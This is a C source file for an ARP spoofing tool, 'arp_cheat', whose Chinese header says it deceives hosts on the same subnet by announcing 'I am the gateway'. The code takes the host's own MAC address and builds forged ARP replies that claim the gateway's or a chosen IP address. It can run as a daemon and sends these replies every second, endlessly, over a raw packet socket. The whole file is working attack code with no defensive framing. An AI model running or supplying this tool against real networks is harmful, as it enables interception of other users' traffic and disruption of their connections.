/*
欺骗同网段下其它主机
向其它主机发送" 我是网关"的虚假arp 信息
*/


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/ioctl.h>			// SIOCGIFINDEX
#include <sys/types.h>
#include <netinet/if_ether.h>		// #include <linux/if_arp.h>
#include <netpacket/packet.h>		// struct sockaddr_ll
#include <net/ethernet.h>		// ETH_P_XXX
#include <net/if.h>			// struct ifreq
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

#include "libwf.h"

struct arp_pkt
{
	unsigned char dst_mac[6];
	unsigned char src_mac[6];
	unsigned short ptype;
	unsigned short hd_type;
	unsigned short prot_type;
	unsigned char hd_size;
	unsigned char prot_size;
	unsigned short opcode;
	unsigned char send_mac[6];
	unsigned int send_ip;
	unsigned char tag_mac[6];
	unsigned int tag_ip;
};

struct arp_pkt arp_info;
unsigned char arp_data[128]={0};
unsigned char host_mac[6], gw_mac[6];
unsigned int cheat_ip, gw_ip, broad_ip;
int sockfd;

int get_info(char *ifname)
{
	char mac[64];
	char gw[16];

	if( get_netdev_mac(ifname, host_mac) < 0 ){
		printf("get mac of %s failed \n", ifname);
		return -1;
	}
	printf("host mac: "MAC_FORMAT_STRING_KERNEL"\n", MAC_FORMAT_SPLIT(host_mac));

	if( get_host_gateway(gw, &gw_ip, ifname) < 0 ){
		printf("get gateway of %s failed \n", ifname);
		return -1;
	}
	printf("gateway: %s \n", gw);
	if(!cheat_ip)
		cheat_ip = gw_ip;

	if( arp_ip2mac(gw, gw_mac, 0x6) < 0){
		printf("get gateway mac failed \n");
		return -1;
	}
	printf("gateway mac: "MAC_FORMAT_STRING_KERNEL"\n", MAC_FORMAT_SPLIT(gw_mac));

	if( get_netdev_broadaddr(ifname, &broad_ip) < 0 ){
		printf("get broadcast ip failed \n");
		return -1;
	}

	return 0;
}

int put_data(int broadcast, int type)
{
	int len = offsetof(struct arp_pkt, send_mac);
	
	memcpy(arp_info.src_mac, host_mac, sizeof(arp_info.src_mac));
	if(type)
		memset(arp_info.dst_mac, 0xff, sizeof(arp_info.dst_mac));
	else{
		if(broadcast)
			memset(arp_info.dst_mac, 0xff, sizeof(arp_info.dst_mac));
		else
			memcpy(arp_info.dst_mac, gw_mac, sizeof(arp_info.dst_mac));
	}

	arp_info.ptype = htons(0x0806);
	arp_info.hd_type = htons(0x0001);
	arp_info.prot_type = htons(0x0800);
	arp_info.hd_size = 6;
	arp_info.prot_size = 4;
	arp_info.opcode = htons(0x0002);
	
	memcpy(arp_info.send_mac, host_mac, sizeof(arp_info.send_mac));
	arp_info.send_ip = cheat_ip;
	if(type){
		memset(arp_info.tag_mac, 0xff, sizeof(arp_info.tag_mac));
		arp_info.tag_ip = gw_ip;
	}
	else{
		if(broadcast){
			memset(arp_info.tag_mac, 0xff, sizeof(arp_info.tag_mac));
			arp_info.tag_ip = broad_ip;
		}
		else{
			memcpy(arp_info.tag_mac, gw_mac, sizeof(arp_info.tag_mac));
			arp_info.tag_ip = gw_ip;
		}
	}

	memcpy(arp_data, &arp_info, len);
	memcpy(&arp_data[len], arp_info.send_mac, sizeof(arp_info.send_mac));
	len += sizeof(arp_info.send_mac);
	memcpy(&arp_data[len], &arp_info.send_ip, sizeof(arp_info.send_ip));
	len += sizeof(arp_info.send_ip);
	memcpy(&arp_data[len], arp_info.tag_mac, sizeof(arp_info.tag_mac));
	len += sizeof(arp_info.tag_mac);
	memcpy(&arp_data[len], &arp_info.tag_ip, sizeof(arp_info.tag_ip));
	len += sizeof(arp_info.tag_ip);

	//print_bytes((unsigned char *)&arp_info, sizeof(arp_info));
	print_bytes(arp_data, len);
	return len;
}

int init_sock(char *ifname)
{
	struct sockaddr_ll sll; // 注意结构体是sockaddr_ll
	int ifindex = -1;

	memset( &sll, 0, sizeof(sll) );
	sll.sll_family = AF_PACKET;

	ifindex = get_netdev_ifindex(ifname);
	if(ifindex < 0){
		printf("get ifindex failed \n");
		return -1;
	}
	
	sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)); // 创建Socket
	if(sockfd < 0){
		printf("socket error, %s \n", strerror(errno));
		return -1;
	}

	//ioctl(sockfd, SIOCGIFINDEX, &ifstruct); 
	sll.sll_ifindex = ifindex;
	sll.sll_protocol = htons(ETH_P_ALL);

	//printf("ifname: %s  ifindex: %d \n", ifname, ifindex);

	if(bind(sockfd, (struct sockaddr *) &sll, sizeof(sll)) == -1 ) //在这里当然仍然需要绑定的
	{
		printf("bind error, %s \n", strerror(errno));
		return -1;
	}

	return 0;
}

void arp_exit_system()
{
	close(sockfd);
	exit(0);
}

static void usage()
{
	fprintf(stderr, "arp_cheat [option] ip \n"
		"    -i: ifname \n"
		"    -g: cheat type: gateway. default: host \n"
		"    -b: broadcast \n"
		"    -d: demon \n"
		"    -h: help \n");
}

int main(int argc, char **argv)
{
	int ch = 0;
	char *ifname = NULL, *ip = NULL;;
	int type = 0, broadcast = 0, demon = 0;
	int ret = 0, len = 0;

	while((ch = getopt(argc,argv,"i:gbdh"))!= -1)
	{
		switch(ch){
		case 'i': ifname = optarg; break;
		case 'g': type = 1; break;
		case 'b': broadcast = 1; break;
		case 'd': demon = 1; break;
		case 'h': usage(); exit(0); break;
		default: fprintf (stderr, "invaild option: %c \n", ch);
			exit(0); break;
		}
	}
	if(optind < argc){
		ip = argv[optind];
	}

	if(!ifname){
		printf("error: no ifname \n");
		exit(0);
	}
	
	if(!type){
		if(!ip){
			printf("error: no ip \n");
			exit(0);
		}

		if(!ip_check(ip)){
			printf("invaild ip: %s \n", ip);
			exit(0);
		}

		if( inet_aton(ip, (struct in_addr *)&cheat_ip) == 0 ){
			printf("ip addr error \n");
			exit(0);
		}
	}
	
	if( get_info(ifname) < 0 ){
		printf("get info failed \n");
		exit(0);
	}

	len = put_data(broadcast, type);

	if(demon)
		wf_demon(arp_exit_system);
	else
		wf_registe_exit_signal(arp_exit_system);

	if( init_sock(ifname) < 0){
		printf("socket failed \n");
		exit(0);
	}
	
	while(1)
	{
		sleep(1);
		ret = send(sockfd, arp_data, len, 0);
		if(!demon)
			printf("ret of send: %d,  %s \n", ret, strerror(errno));
	}

	arp_exit_system();
	return 0;
}


